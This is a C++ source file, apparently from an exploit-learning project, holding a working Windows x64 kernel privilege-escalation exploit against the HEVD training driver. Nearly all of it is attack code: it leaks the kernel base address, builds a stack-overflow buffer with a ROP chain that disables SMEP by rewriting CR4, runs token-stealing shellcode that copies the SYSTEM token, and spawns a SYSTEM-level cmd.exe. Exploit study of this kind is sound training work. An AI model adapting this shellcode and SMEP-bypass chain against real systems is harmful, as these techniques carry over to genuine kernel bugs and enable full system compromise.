
#include "InformationClass.h"


// Getting Kernel base address
// There is more easier way to get Base kernel address, through EnumDeviceDrivers() which is the Win32api(process header).

KernelBase_X64 ExploitHevd_x64::_Getting_KernelBase_address_x64()
{
	_typedef_kernelBase = 0;

	_hNtdll = GetModuleHandleA("ntdll.dll");
	if (_hNtdll == INVALID_HANDLE_VALUE)
	{
		std::cerr << "[-] Error to get ntdll.dll module Handle" << std::endl;
		exit(0);
	}

	_NtQuerySystemInformation_ = (_NtQuerySystemInformation)GetProcAddress(_hNtdll,
		"NtQuerySystemInformation");
	if (_NtQuerySystemInformation_ == nullptr)
	{
		std::cerr << "[-] Coulndn't Get proc address" << std::endl;
		exit(0);
	}

	_NtQuerySystemInformation_(SystemModuleInformation,
		nullptr,
		0,
		&_dLen); 

	_pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr,
		_dLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	
	if (_pModuleInformation == nullptr)
	{
		std::cerr << "[-] VirtualAlloc() error" << std::endl;
		exit(0);
	}
	_NtQuerySystemInformation_(SystemModuleInformation,
		_pModuleInformation,
		_dLen,
		&_dLen);
	
	_KernelImageBase = _pModuleInformation->Module[0].ImageBase;
	VirtualFree(_pModuleInformation,
		0,
		MEM_RELEASE);

	return (__int64)_KernelImageBase;
}

// Function that will spawn, cmd.exe but with nt-system privileges
void ExploitHevd_x64::_SpwnCmd()
{
	std::cout << "[+] Cmd.exe pwn" << std::endl;

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));

	CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);
}

// Main function that sends our exploit to target driver
void ExploitHevd_x64::_SendExploit()
{
	// Creating object of ROP CHAIN Struct
	pRpc = new PROP_CHAIN();

	// Sets buffer to zero 
	BYTE _buffer[2088] = { 0 };

	// ShellCode
	// This shellcode will gain nt-system previlage to our target process(in our case cmd.exe) 
	
	/*
	The exclusive operation of that ShellCode is that, 
	when we finish executing the code we will bypass the registers(rsi, rax).
	which is the NT_STATUS, to value of 0 and retrive normal flow which gives as the ability to execute our shellcode normally with out crashing the system.
	*/

	// * NOTE : In any version of windows & bugs class there may be other way of returning to normal flow execution

	// Credit to @Cneelis
	BYTE shellcode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
		"\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
		"\x74\x05"                                  // jz found_system          ; Found SYSTEM token
		"\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"                                  // jmp find_system_proc     ; Loop
		//found_system:
		"\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
		"\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
		"\x48\x83\xC4\x40"                          // add rsp, 040h
		"\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
		"\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
		"\xc3";

	LPVOID shellcode_addr;


	// Allocating page for the shellcode, in short this page will be executed and will contain our shellcode
	/* 
		Note if we will use this method in modern versions of windows(windows 8 until windows 10 etc), without disabling the SEMP protection(cr4 register) we will get a crash(BSOD) 
		that says we cannot execute(our shellcode) from user page memory
	*/
	
	shellcode_addr = VirtualAlloc(nullptr,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (shellcode_addr == nullptr)
	{
		std::cerr << "[-] Failed to allocate page <R^W> for the shellcode" << std::endl;
		exit(0);
	}

	// Copying our Shellcode into the page memory 
	RtlCopyMemory(shellcode_addr, shellcode, sizeof(shellcode));

	std::cout << "\t[+] Shellcode copyed" << std::endl;



	// Getting kernel base address
	auto ntBase = _Getting_KernelBase_address_x64();			
	std::cout << "\t[+] Nt kernel address : \t0x" << std::hex << ntBase << std::endl; 
	
	// Getting our first gadget 
	pRpc->_pop_rcx_offset = ntBase + 0x3D9E80;
	std::cout << "\t[+] offset <Gadget 1> [ pop rcx ] : 0x" << std::hex << pRpc->_pop_rcx_offset << std::endl;

	// Setting rcx value: 
	pRpc->_rcx_value = 0x70678;
	
	// Moving rcx value into cr4 
	pRpc->_mov_rcx_cr4_offset = ntBase + 0x9B3613; 

	std::cout << "\t[+] offset <Gadget 2> [ mov cr4, rcx ] : 0x" << std::hex << pRpc->_mov_rcx_cr4_offset << std::endl;

	memset(_buffer, '\x41', 2056);

	// Note that, when we adding 8 bytes we actually executing new instruction 
	RtlCopyMemory(_buffer + 2056, (__int64*)&pRpc->_pop_rcx_offset, 8);					// pop rcx to put new value into it
	RtlCopyMemory(_buffer + 2064, (__int64*)&pRpc->_rcx_value, 8);							// register 0x70678 value, that going to bypass the 20th bit in cr4 
	RtlCopyMemory(_buffer + 2072, (__int64*)&pRpc->_mov_rcx_cr4_offset, 8);				// moving the new value from rcx into cr4 
	RtlCopyMemory(_buffer + 2080, (__int64*)&shellcode_addr, 8);							// return to our shellcode from kernel space(When we doing all these operations in kernel space SMEP is not relevant anymore, because smep works against user page pages and we bypass it so we can jump to user space code)

	// Just grabs the handle(Device object, that create by CreateSymbolicLink() method)
	auto hFile = _DeviceObject_Grabber();	

	// Create DeviceIoContorl() request to the current IOCTL(0x800), that process the data via METHOD_NEITHER which means that the driver just using SystemBuffer to transfer data(its the simplest way to transfer data between user/kernel not using APC's or MDL's)
	DWORD bytes = 0x0;
	auto DeviceObj = DeviceIoControl(hFile,
		IOCTL_SOF_CODE,
		_buffer,
		sizeof(_buffer),
		nullptr,
		0,
		&bytes,
		nullptr);
	if (!DeviceObj)
	{
		std::cerr << "[-] Failed to send/create Device object" << std::endl;
		exit(0);
	}

	CloseHandle(hFile);
	delete(pRpc);
}


// Grabbing device object handle 
HANDLE ExploitHevd_x64::_DeviceObject_Grabber()
{
	auto hFile = CreateFileA(DEV_OBJ_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cerr << "[-] Failed getting device object handle" << std::endl;
		exit(0);
	}
	
	std::cout << "\t[+] Handler grabed at : 0x" << std::hex << (unsigned __int64)hFile << std::endl;
	
	return hFile;
}

